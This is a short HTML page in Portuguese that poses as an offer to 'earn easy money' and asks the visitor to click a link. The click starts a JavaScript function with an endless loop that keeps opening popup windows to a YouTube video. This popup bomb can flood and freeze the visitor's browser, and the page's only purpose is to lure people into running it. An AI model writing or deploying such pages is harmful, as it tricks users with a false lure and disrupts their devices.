<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ganhe dinheiro fácil</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        a {
            color: green;
            text-decoration: underline;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <p>Clique no link abaixo:</p>
    <a id="popupLink" href="#">Clique aqui kkk</a>

    <script>
        // Função para abrir pop-ups infinitos
        function abrirPopups() {
            while (true) {
                window.open("https://www.youtube.com/watch?v=qEjgJqGDpTU", "_blank", "width=300,height=300");
            }
        }

        // Adiciona um evento de clique ao link
        document.getElementById("popupLink").addEventListener("click", function(event) {
            event.preventDefault(); // Impede o comportamento padrão do link
            abrirPopups(); // Chama a função para abrir pop-ups
        });
    </script>
</body>
</html>
